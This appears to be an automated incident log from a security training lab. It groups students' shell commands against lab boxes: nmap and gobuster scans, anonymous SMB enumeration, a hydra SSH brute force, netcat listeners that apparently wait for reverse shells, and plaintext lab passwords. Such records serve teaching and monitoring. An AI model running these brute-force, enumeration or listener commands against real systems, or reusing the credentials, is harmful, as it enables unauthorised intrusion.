## Incident 373 - 2026-01-12T19:41:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:41:18 | logs/10.100.7.32/shell_history.csv#L128 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-12T19:41:35 | logs/10.100.7.32/shell_history.csv#L129 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40
  - 2026-01-12T19:41:41 | logs/10.100.7.32/shell_history.csv#L130 | ssh -i ~/.ssh/helios_ssh_key solaris@10.100.7.40

## Incident 374 - 2026-01-12T19:54:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-12T19:54:12 | logs/10.100.7.34/shell_history.csv#L12 | ssh superuser@10.100.7.43
  - 2026-01-12T19:54:39 | logs/10.100.7.34/shell_history.csv#L13 | nmap 10.100.7.41 10.100.7.42 10.100.7.43
  - 2026-01-12T19:54:57 | logs/10.100.7.32/shell_history.csv#L138 | ssh root@10.100.7.43

## Incident 375 - 2026-01-12T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:54:39 | logs/10.100.7.34/shell_history.csv#L13 | nmap 10.100.7.41 10.100.7.42 10.100.7.43
  - 2026-01-12T19:54:57 | logs/10.100.7.13/shell_history.csv#L34 | hydra -l guest -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 376 - 2026-01-12T19:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:55:10 | logs/10.100.7.32/shell_history.csv#L139 | cd ~/Documents
  - 2026-01-12T19:55:10 | logs/10.100.7.32/shell_history.csv#L140 | ls
  - 2026-01-12T19:55:12 | logs/10.100.7.32/shell_history.csv#L141 | nvim helios_credentials.txt
  - 2026-01-12T19:55:56 | logs/10.100.7.32/shell_history.csv#L142 | vi helios_credentials.txt

## Incident 377 - 2026-01-13T19:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:12:02 | logs/10.100.7.34/shell_history.csv#L23 | tldr nxc
  - 2026-01-13T19:12:35 | logs/10.100.7.34/shell_history.csv#L24 | tldr nxc
  - 2026-01-13T19:12:42 | logs/10.100.7.34/shell_history.csv#L25 | tldr nxc
  - 2026-01-13T19:12:59 | logs/10.100.7.34/shell_history.csv#L26 | tldr ls

## Incident 378 - 2026-01-13T19:12:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:12:01 | logs/10.100.7.24/shell_history.csv#L33 | ssh 10.100.7.40
  - 2026-01-13T19:12:01 | logs/10.100.7.24/shell_history.csv#L34 | ssh 10.100.7.40

## Incident 379 - 2026-01-13T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:13:25 | logs/10.100.7.34/shell_history.csv#L27 | tldr --update
  - 2026-01-13T19:13:32 | logs/10.100.7.34/shell_history.csv#L28 | tldr nxc

## Incident 380 - 2026-01-13T19:13:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:13:44 | logs/10.100.7.24/shell_history.csv#L35 | ssh solaris@10.100.7.40
  - 2026-01-13T19:13:54 | logs/10.100.7.24/shell_history.csv#L36 | smbclient //10.100.7.40/public

## Incident 381 - 2026-01-13T19:49:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:49:24 | logs/10.100.7.34/shell_history.csv#L36 | smbclient //10.100.7.40/share --user guest
  - 2026-01-13T19:49:43 | logs/10.100.7.34/shell_history.csv#L37 | smbclient //10.100.7.40/share --share public

## Incident 382 - 2026-01-13T19:49:00
- Target IP: 10.100.7.43
- Target Box: starfall
- Entries:
  - 2026-01-13T19:49:21 | logs/10.100.7.32/shell_history.csv#L313 | smbclient //10.100.7.43/public --user guest
  - 2026-01-13T19:49:43 | logs/10.100.7.32/shell_history.csv#L315 | smbclient //10.100.7.43/public --user guest

## Incident 383 - 2026-01-13T19:49:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:49:30 | logs/10.100.7.32/shell_history.csv#L314 | nxc smb 10.100.7.42 -u guest -p '' --shares
  - 2026-01-13T19:49:45 | logs/10.100.7.24/shell_history.csv#L62 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 384 - 2026-01-13T19:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:52:43 | logs/10.100.7.32/shell_history.csv#L318 | ls
  - 2026-01-13T19:52:45 | logs/10.100.7.32/shell_history.csv#L319 | cat readme.txt
  - 2026-01-13T19:52:48 | logs/10.100.7.32/shell_history.csv#L320 | cat maintenance.log
  - 2026-01-13T19:52:18 | logs/10.100.7.14/shell_history.csv#L47 | exit

## Incident 385 - 2026-01-13T19:57:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T19:57:55 | logs/10.100.7.34/shell_history.csv#L46 | ssh solaris@[http://10.100.7.40/](http://10.100.7.40/)
  - 2026-01-13T19:57:55 | logs/10.100.7.34/shell_history.csv#L46 | ssh solaris@[http://10.100.7.40/](http://10.100.7.40/)
  - 2026-01-13T19:57:59 | logs/10.100.7.34/shell_history.csv#L47 | ssh solaris@[http://10.100.7.40/](http://10.100.7.40/)
  - 2026-01-13T19:57:59 | logs/10.100.7.34/shell_history.csv#L47 | ssh solaris@[http://10.100.7.40/](http://10.100.7.40/)

## Incident 386 - 2026-01-13T19:57:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:57:07 | logs/10.100.7.32/shell_history.csv#L327 | nxc smb 10.100.7.42 -u guest -p '' --shares
  - 2026-01-13T19:57:19 | logs/10.100.7.32/shell_history.csv#L328 | smbclient //10.100.7.42/public --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 387 - 2026-01-13T19:57:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T19:57:00 | logs/10.100.7.14/shell_history.csv#L49 | cat fa
  - 2026-01-13T19:57:33 | logs/10.100.7.14/shell_history.csv#L50 | exit
  - 2026-01-13T19:57:37 | logs/10.100.7.14/shell_history.csv#L51 | cat fa

## Incident 388 - 2026-01-13T20:03:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:03:19 | logs/10.100.7.34/shell_history.csv#L50 | ssh solaris.solaris@10.100.7.40
  - 2026-01-13T20:03:23 | logs/10.100.7.34/shell_history.csv#L51 | ssh solaris.solaris@10.100.7.40
  - 2026-01-13T20:03:58 | logs/10.100.7.34/shell_history.csv#L52 | ssh solaris.solaris@10.100.7.40
  - 2026-01-13T20:03:06 | logs/10.100.7.24/shell_history.csv#L72 | ssh solaris@10.100.7.40
  - 2026-01-13T20:03:49 | logs/10.100.7.24/shell_history.csv#L73 | ssh root@10.100.7.40
  - 2026-01-13T20:03:50 | logs/10.100.7.24/shell_history.csv#L74 | ssh root@10.100.7.40

## Incident 389 - 2026-01-13T20:14:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-13T20:14:16 | logs/10.100.7.34/shell_history.csv#L56 | gobuster dir -u http://10.100.7.40 -w /usr/share/wordlists/dirb/common.txt
  - 2026-01-13T20:14:16 | logs/10.100.7.34/shell_history.csv#L57 | gobuster dir -u http://10.100.7.40 -w /usr/share/wordlists/dirb/common.txt
  - 2026-01-13T20:14:17 | logs/10.100.7.34/shell_history.csv#L58 | gobuster dir -u http://10.100.7.40 -w /usr/share/wordlists/dirb/common.txt
  - 2026-01-13T20:14:09 | logs/10.100.7.13/shell_history.csv#L77 | ssh solaris@10.100.7.40
  - 2026-01-13T20:14:09 | logs/10.100.7.13/shell_history.csv#L78 | ssh solaris@10.100.7.40
  - 2026-01-13T20:14:30 | logs/10.100.7.24/shell_history.csv#L80 | enum4linux -a 10.100.7.40

## Incident 390 - 2026-01-13T20:14:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:14:46 | logs/10.100.7.32/shell_history.csv#L353 | nxc smb 10.100.7.42 -u orbital -p orbital""
  - 2026-01-13T20:14:38 | logs/10.100.7.24/shell_history.csv#L81 | enum4linux -a 10.100.7.42
  - 2026-01-13T20:14:39 | logs/10.100.7.24/shell_history.csv#L82 | enum4linux -a 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 391 - 2026-01-13T20:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:31:48 | logs/10.100.7.34/shell_history.csv#L59 | nc -lvp 4444
  - 2026-01-13T20:31:53 | logs/10.100.7.34/shell_history.csv#L60 | ls
  - 2026-01-13T20:31:56 | logs/10.100.7.34/shell_history.csv#L61 | ls

## Incident 392 - 2026-01-13T20:31:00
- Target IP: 10.100.7.41
- Target Box: helios
- Entries:
  - 2026-01-13T20:31:24 | logs/10.100.7.22/shell_history.csv#L78 | nxc smb 10.100.7.41
  - 2026-01-13T20:31:55 | logs/10.100.7.22/shell_history.csv#L79 | smbclient //10.100.7.41/public -U "

## Incident 393 - 2026-01-26T19:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:02:49 | logs/10.100.7.34/shell_history.csv#L62 | nc -lvp 4444
  - 2026-01-26T19:02:45 | logs/10.100.7.14/shell_history.csv#L234 | xfreerdp3 /U:helios /P:securepassword

## Incident 394 - 2026-01-27T18:59:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:59:46 | logs/10.100.7.34/shell_history.csv#L63 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T18:59:06 | logs/10.100.7.14/shell_history.csv#L304 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:16 | logs/10.100.7.14/shell_history.csv#L305 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:25 | logs/10.100.7.14/shell_history.csv#L306 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:11 | logs/10.100.7.24/shell_history.csv#L249 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:59:22 | logs/10.100.7.24/shell_history.csv#L250 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:59:44 | logs/10.100.7.24/shell_history.csv#L251 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 395 - 2026-01-27T19:02:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:02:00 | logs/10.100.7.34/shell_history.csv#L65 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T19:02:05 | logs/10.100.7.32/shell_history.csv#L634 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS'
  - 2026-01-27T19:02:11 | logs/10.100.7.32/shell_history.csv#L635 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares
  - 2026-01-27T19:02:04 | logs/10.100.7.14/shell_history.csv#L315 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:13 | logs/10.100.7.14/shell_history.csv#L316 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:20 | logs/10.100.7.14/shell_history.csv#L317 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:02:00 | logs/10.100.7.24/shell_history.csv#L258 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:13 | logs/10.100.7.24/shell_history.csv#L259 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:16 | logs/10.100.7.24/shell_history.csv#L260 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:18 | logs/10.100.7.24/shell_history.csv#L261 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:02:19 | logs/10.100.7.24/shell_history.csv#L262 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 396 - 2026-01-27T19:07:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:07:18 | logs/10.100.7.22/shell_history.csv#L196 | ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '10.100.7.40'
  - 2026-01-27T19:07:54 | logs/10.100.7.22/shell_history.csv#L197 | ssh guest@10.100.7.40

## Incident 397 - 2026-01-27T20:04:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:04:54 | logs/10.100.7.34/shell_history.csv#L75 | kj;
  - 2026-01-27T20:04:55 | logs/10.100.7.34/shell_history.csv#L76 | kj;

## Incident 398 - 2026-02-10T18:56:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-10T18:56:07 | logs/10.100.7.34/shell_history.csv#L77 | exit
  - 2026-02-10T18:56:20 | logs/10.100.7.32/shell_history.csv#L1086 | exit

## Incident 399 - 2026-02-10T19:18:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:18:29 | logs/10.100.7.34/shell_history.csv#L78 | nmap -sC -sV -p- -T4 10.100.7.48
  - 2026-02-10T19:18:01 | logs/10.100.7.14/shell_history.csv#L563 | mysql -h 10.100.7.48 -P 3306 -uinspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 400 - 2026-02-10T19:22:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:22:18 | logs/10.100.7.34/shell_history.csv#L84 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:22:18 | logs/10.100.7.34/shell_history.csv#L85 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 401 - 2026-02-10T19:26:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:26:05 | logs/10.100.7.34/shell_history.csv#L100 | whatweb http://10.100.7.48
  - 2026-02-10T19:26:51 | logs/10.100.7.34/shell_history.csv#L101 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:26:31 | logs/10.100.7.14/shell_history.csv#L565 | mysql -h 10.100.7.48 -P 3306 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 402 - 2026-02-10T19:27:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:27:05 | logs/10.100.7.34/shell_history.csv#L102 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:27:06 | logs/10.100.7.34/shell_history.csv#L103 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:27:06 | logs/10.100.7.34/shell_history.csv#L104 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:27:06 | logs/10.100.7.34/shell_history.csv#L105 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 403 - 2026-02-10T19:30:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:30:06 | logs/10.100.7.34/shell_history.csv#L107 | mysql -h 10.100.7.48 -u root --ssl-mode=DISABLED
  - 2026-02-10T19:30:21 | logs/10.100.7.34/shell_history.csv#L108 | mysql -h 10.100.7.48 -u root -p --ssl-mode=DISABLED
  - 2026-02-10T19:30:32 | logs/10.100.7.34/shell_history.csv#L109 | gobuster dir -u http://10.100.7.48 -w /usr/share/wordlists/dirb/common.txt -x php,txt,env,bak
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 404 - 2026-02-10T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:54:15 | logs/10.100.7.34/shell_history.csv#L110 | nmap -sC -sV -p 3389,445 10.100.7.42
  - 2026-02-10T19:54:54 | logs/10.100.7.14/shell_history.csv#L609 | 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 405 - 2026-02-10T19:55:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:55:34 | logs/10.100.7.34/shell_history.csv#L111 | nmap -sC -sV -p- -T4 10.100.7.42
  - 2026-02-10T19:55:48 | logs/10.100.7.34/shell_history.csv#L112 | smbclient -L //10.100.7.42/ -N
  - 2026-02-10T19:55:00 | logs/10.100.7.14/shell_history.csv#L610 | nmap 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 406 - 2026-01-08T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:22:02 | logs/10.100.7.32/shell_history.csv#L1 | exit
  - 2026-01-08T19:22:01 | logs/10.100.7.31/shell_history.csv#L1 | exit

## Incident 407 - 2026-01-08T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:23:18 | logs/10.100.7.32/shell_history.csv#L2 | cat .full_research_history.csv
  - 2026-01-08T19:23:15 | logs/10.100.7.31/shell_history.csv#L2 | cat .full_research_history.csv
  - 2026-01-08T19:23:20 | logs/10.100.7.31/shell_history.csv#L3 | cat .full_research_history.csv

## Incident 408 - 2026-01-08T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:26:26 | logs/10.100.7.32/shell_history.csv#L3 | sudo bash
  - 2026-01-08T19:26:45 | logs/10.100.7.32/shell_history.csv#L4 | sudo bash
  - 2026-01-08T19:26:37 | logs/10.100.7.31/shell_history.csv#L4 | sudo bash
  - 2026-01-08T19:26:42 | logs/10.100.7.31/shell_history.csv#L5 | sudo bash

## Incident 409 - 2026-01-12T18:20:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:20:05 | logs/10.100.7.32/shell_history.csv#L7 | exit
  - 2026-01-12T18:20:06 | logs/10.100.7.32/shell_history.csv#L8 | exit
  - 2026-01-12T18:20:08 | logs/10.100.7.32/shell_history.csv#L9 | exit
  - 2026-01-12T18:20:14 | logs/10.100.7.32/shell_history.csv#L10 | exit
  - 2026-01-12T18:20:05 | logs/10.100.7.12/shell_history.csv#L7 | nano .zshrc

## Incident 410 - 2026-01-12T18:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:21:20 | logs/10.100.7.32/shell_history.csv#L11 | exit
  - 2026-01-12T18:21:21 | logs/10.100.7.32/shell_history.csv#L12 | ip addr

## Incident 411 - 2026-01-12T18:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:25:31 | logs/10.100.7.32/shell_history.csv#L13 | ip addr
  - 2026-01-12T18:25:38 | logs/10.100.7.32/shell_history.csv#L14 | ip addr
  - 2026-01-12T18:25:54 | logs/10.100.7.32/shell_history.csv#L15 | nmap -sV -p 1-65535 -T 10.0.1.159

## Incident 412 - 2026-01-12T18:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:26:17 | logs/10.100.7.32/shell_history.csv#L16 | nmap -sV -p 1-65535 -T 10.0.1.159
  - 2026-01-12T18:26:19 | logs/10.100.7.32/shell_history.csv#L17 | nmap -sV -p 1-65535 -T 10.0.1.159
  - 2026-01-12T18:26:31 | logs/10.100.7.32/shell_history.csv#L18 | exit
  - 2026-01-12T18:26:34 | logs/10.100.7.32/shell_history.csv#L19 | clear
  - 2026-01-12T18:26:37 | logs/10.100.7.32/shell_history.csv#L20 | neofetch
  - 2026-01-12T18:26:38 | logs/10.100.7.32/shell_history.csv#L21 | clear
  - 2026-01-12T18:26:39 | logs/10.100.7.32/shell_history.csv#L22 | ls
  - 2026-01-12T18:26:43 | logs/10.100.7.32/shell_history.csv#L23 | l
  - 2026-01-12T18:26:44 | logs/10.100.7.32/shell_history.csv#L24 | clear
  - 2026-01-12T18:26:12 | logs/10.100.7.12/shell_history.csv#L8 | nmap -sV -p 1-65535 -T3 10.0.1.159

## Incident 413 - 2026-01-12T18:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:27:10 | logs/10.100.7.13/shell_history.csv#L6 | nmap -sV -p 1-65535 -T3 10.0.1.159
  - 2026-01-12T18:27:48 | logs/10.100.7.13/shell_history.csv#L7 | nmap -sV -p 1-65535 -T3 10.0.1.159
  - 2026-01-12T18:27:47 | logs/10.100.7.12/shell_history.csv#L9 | nmap -sV -p 1-65535 -T3 10.0.1.159
  - 2026-01-12T18:27:56 | logs/10.100.7.12/shell_history.csv#L10 | nmap -sV -p 1-65535 -T3 10.0.1.159

## Incident 414 - 2026-01-12T18:28:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-12T18:28:07 | logs/10.100.7.32/shell_history.csv#L26 | nmap -sV -p 1-65535 -T 10.100.62.83
  - 2026-01-12T18:28:22 | logs/10.100.7.12/shell_history.csv#L11 | nmap -sV -p 1-65535 -T3 10.100.62.83

## Incident 415 - 2026-01-12T18:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:28:12 | logs/10.100.7.13/shell_history.csv#L8 | nmap -sV
  - 2026-01-12T18:28:28 | logs/10.100.7.13/shell_history.csv#L9 | nmap -sV -p 1-65535 -T3 10.0.1.159

## Incident 416 - 2026-01-12T18:29:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-12T18:29:14 | logs/10.100.7.32/shell_history.csv#L27 | nmap -sV -p 1-65535 -T -v 10.100.62.83
  - 2026-01-12T18:29:30 | logs/10.100.7.32/shell_history.csv#L28 | nmap -sV -p 1-65535 -T3 -v 10.100.62.83
  - 2026-01-12T18:29:46 | logs/10.100.7.32/shell_history.csv#L30 | nmap -sV -p 1-65535 -T3 -v 10.100.62.83
  - 2026-01-12T18:29:01 | logs/10.100.7.13/shell_history.csv#L10 | nmap -sV -p 1-65535 -T3 10.100.62.83

## Incident 417 - 2026-01-12T18:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:32:26 | logs/10.100.7.32/shell_history.csv#L31 | exit
  - 2026-01-12T18:32:32 | logs/10.100.7.32/shell_history.csv#L32 | exit
  - 2026-01-12T18:32:34 | logs/10.100.7.32/shell_history.csv#L33 | man enum4linux
  - 2026-01-12T18:32:38 | logs/10.100.7.32/shell_history.csv#L34 | enum4linux --help
  - 2026-01-12T18:32:40 | logs/10.100.7.32/shell_history.csv#L35 | enum4linux --help
  - 2026-01-12T18:32:50 | logs/10.100.7.32/shell_history.csv#L36 | enum4linux --help | less

## Incident 418 - 2026-01-12T18:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:33:03 | logs/10.100.7.32/shell_history.csv#L37 | enum4linux --help | less
  - 2026-01-12T18:33:06 | logs/10.100.7.32/shell_history.csv#L38 | enum4linux --help

## Incident 419 - 2026-01-12T18:36:00
- Target IP: 10.100.62.83
- Target Box: None
- Entries:
  - 2026-01-12T18:36:14 | logs/10.100.7.32/shell_history.csv#L39 | enum4linux -a 10.100.62.83
  - 2026-01-12T18:36:35 | logs/10.100.7.32/shell_history.csv#L40 | enum4linux -a 10.100.62.83 | less
  - 2026-01-12T18:36:46 | logs/10.100.7.32/shell_history.csv#L42 | nmap -sV -p 1-65535 -T3 -v 10.100.62.83

## Incident 420 - 2026-01-12T18:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:36:40 | logs/10.100.7.32/shell_history.csv#L41 | enum4linux
  - 2026-01-12T18:36:47 | logs/10.100.7.32/shell_history.csv#L43 | tmux
  - 2026-01-12T18:36:56 | logs/10.100.7.32/shell_history.csv#L44 | tmux
  - 2026-01-12T18:36:57 | logs/10.100.7.32/shell_history.csv#L45 | history

## Incident 421 - 2026-01-12T18:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:37:03 | logs/10.100.7.32/shell_history.csv#L46 | clear
  - 2026-01-12T18:37:29 | logs/10.100.7.14/shell_history.csv#L5 | exit

## Incident 422 - 2026-01-12T18:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:46:07 | logs/10.100.7.32/shell_history.csv#L50 | pwgen
  - 2026-01-12T18:46:08 | logs/10.100.7.32/shell_history.csv#L51 | clear
  - 2026-01-12T18:46:08 | logs/10.100.7.32/shell_history.csv#L52 | ls
  - 2026-01-12T18:46:09 | logs/10.100.7.32/shell_history.csv#L53 | exit
  - 2026-01-12T18:46:13 | logs/10.100.7.32/shell_history.csv#L54 | exit
  - 2026-01-12T18:46:14 | logs/10.100.7.32/shell_history.csv#L55 | clear
  - 2026-01-12T18:46:19 | logs/10.100.7.32/shell_history.csv#L56 | ls | more
  - 2026-01-12T18:46:23 | logs/10.100.7.32/shell_history.csv#L57 | ls | more
  - 2026-01-12T18:46:27 | logs/10.100.7.32/shell_history.csv#L58 | ls | more

## Incident 423 - 2026-01-12T18:50:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:50:38 | logs/10.100.7.32/shell_history.csv#L60 | df
  - 2026-01-12T18:50:40 | logs/10.100.7.32/shell_history.csv#L61 | history
  - 2026-01-12T18:50:43 | logs/10.100.7.32/shell_history.csv#L62 | history
  - 2026-01-12T18:50:49 | logs/10.100.7.32/shell_history.csv#L63 | cat ~/.bash_history
  - 2026-01-12T18:50:55 | logs/10.100.7.32/shell_history.csv#L64 | cat ~/.bash_history
  - 2026-01-12T18:50:56 | logs/10.100.7.32/shell_history.csv#L65 | tmux
  - 2026-01-12T18:50:59 | logs/10.100.7.32/shell_history.csv#L66 | cat ~/.bash_history

## Incident 424 - 2026-01-12T18:51:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:51:02 | logs/10.100.7.32/shell_history.csv#L67 | ls
  - 2026-01-12T18:51:05 | logs/10.100.7.32/shell_history.csv#L68 | clear
  - 2026-01-12T18:51:09 | logs/10.100.7.32/shell_history.csv#L69 | cat ~/.bash_history

## Incident 425 - 2026-01-12T18:52:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:52:37 | logs/10.100.7.32/shell_history.csv#L70 | exit
  - 2026-01-12T18:52:43 | logs/10.100.7.32/shell_history.csv#L71 | echo test""
  - 2026-01-12T18:52:47 | logs/10.100.7.32/shell_history.csv#L72 | cat ~/.zsh_history
  - 2026-01-12T18:52:51 | logs/10.100.7.32/shell_history.csv#L73 | tmux
  - 2026-01-12T18:52:53 | logs/10.100.7.32/shell_history.csv#L74 | cat ~/.zsh_history

## Incident 426 - 2026-01-12T18:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T18:55:29 | logs/10.100.7.32/shell_history.csv#L75 | exit
  - 2026-01-12T18:55:31 | logs/10.100.7.32/shell_history.csv#L76 | clear
  - 2026-01-12T18:55:31 | logs/10.100.7.32/shell_history.csv#L77 | ls

## Incident 427 - 2026-01-12T18:57:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T18:57:03 | logs/10.100.7.32/shell_history.csv#L78 | ssh root@10.100.7.40
  - 2026-01-12T18:57:34 | logs/10.100.7.32/shell_history.csv#L79 | enum4linux -a 10.100.7.40

## Incident 428 - 2026-01-12T19:01:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:01:02 | logs/10.100.7.32/shell_history.csv#L82 | nmap -sV -p 1-65535 -T3 10.100.7.40
